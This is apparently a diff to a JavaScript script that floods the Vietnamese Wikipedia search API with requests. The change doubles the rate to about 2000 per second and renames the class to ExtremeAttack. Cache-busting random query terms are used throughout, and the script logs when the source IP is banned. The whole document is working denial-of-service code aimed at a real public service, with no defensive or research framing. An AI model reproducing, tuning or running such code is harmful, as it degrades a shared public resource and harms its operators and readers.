@@ -1,37 +1,35 @@
-class InfiniteAttack {
+class ExtremeAttack {
     constructor() {
-        this.stats = {
-            totalFired: 0,
-            success200: 0,
-            permanentBan: false
-        };
+        this.stats = { totalFired: 0, success200: 0, permanentBan: false };
         this.attackActive = true;
-        console.log('☢️  INFINITE 1000 REQ/S - NO MERCY MODE');
+        console.log('☢️  2000 REQ/S - EXTREME MODE');
     }
+    
     async launchAttackWave(waveNumber) {
-        const waveSize = 250; // 4 waves = 1000 requests
+        const waveSize = 500;
         const totalWaves = 4;
+        
         for (let w = 0; w < totalWaves && this.attackActive; w++) {
             const promises = [];
+            
             for (let i = 0; i < waveSize; i++) {
                 const uniqueID = Date.now() + Math.random() + waveNumber + w + i;
-                const url = `https://vi.wikipedia.org/w/api.php?action=query&format=json&origin=*&list=search&srsearch=kill${uniqueID}`;
+                const url = `https://vi.wikipedia.org/w/api.php?action=query&format=json&origin=*&list=search&srsearch=extreme${uniqueID}`;
+                
                 promises.push(
                     (async () => {
                         try {
-                            const start = performance.now();
                             const res = await fetch(url);
                             this.stats.totalFired++;
                             if (res.status === 200) {
                                 this.stats.success200++;
-                                const speed = performance.now() - start;
                                 if (this.stats.success200 <= 30) {
-                                    console.log(`[${waveNumber}.${w}] ✅ 200 (${speed.toFixed(0)}ms)`);
+                                    console.log(`[${waveNumber}.${w}] ✅ 200`);
                                 }
                             }
                             if (res.status === 403 && !this.stats.permanentBan) {
                                 this.stats.permanentBan = true;
-                                console.log(`💀 PERMANENT BAN DETECTED - IP ĐÃ CHẾT!`);
+                                console.log(`💀 PERMANENT BAN`);
                             }
                         } catch (err) {
                             this.stats.totalFired++;
@@ -39,42 +37,47 @@ class InfiniteAttack {
                     })()
                 );
             }
+            
             Promise.allSettled(promises).catch(() => {});
+            
             if (w < totalWaves - 1) {
                 await new Promise(resolve => setTimeout(resolve, 0));
             }
         }
     }
-    startInfiniteAttack() {
-        console.log('🔥 NUKE...\n');
+    
+    startExtremeAttack() {
+        console.log('🔥 LAUNCHING 2000 REQ/S...\n');
         let secondCounter = 0;
+        
         const attackInterval = setInterval(() => {
             secondCounter++;
-            console.log(`⏰ GIÂY ${secondCounter}: Đã gửi ${this.stats.totalFired} requests | 200: ${this.stats.success200}`);
+            console.log(`⏰ SECOND ${secondCounter}: ${this.stats.totalFired} req | 200: ${this.stats.success200}`);
             
             if (this.stats.permanentBan) {
-                console.log(`🪦 ${secondCounter} GIÂY`);
+                console.log(`🪦 BANNED AT ${secondCounter}s`);
                 clearInterval(attackInterval);
                 this.stop();
             }
+            
             this.launchAttackWave(secondCounter);
             
-        }, 1000);
+        }, 500);
 
         this.stop = () => {
             clearInterval(attackInterval);
             this.attackActive = false;
-            console.log(`\n💀 KẾT THÚC SAU ${secondCounter} GIÂY:`);
-            console.log(`   Tổng requests: ${this.stats.totalFired}`);
+            console.log(`\n💀 FINAL AFTER ${secondCounter}s:`);
+            console.log(`   Total: ${this.stats.totalFired}`);
             console.log(`   200 OK: ${this.stats.success200}`);
-            console.log(`   Tỷ lệ: ${(this.stats.success200/this.stats.totalFired*100).toFixed(3)}%`);
-            console.log(`   IP GitHub đã BỊ BAN ${this.stats.permanentBan ? 'VĨNH VIỄN' : 'ít nhất 1 tháng'}`);
+            console.log(`   Rate: ${(this.stats.success200/this.stats.totalFired*100).toFixed(3)}%`);
+            console.log(`   IP BANNED ${this.stats.permanentBan ? 'PERMANENTLY' : 'MIN 1 MONTH'}`);
         };
     }
 }
 
-const deathWish = new InfiniteAttack();
-deathWish.startInfiniteAttack();
+const nuclear = new ExtremeAttack();
+nuclear.startExtremeAttack();
 setTimeout(() => {
-    if (deathWish.stop) deathWish.stop();
-}, 200000);
+    if (nuclear.stop) nuclear.stop();
+}, 15000);
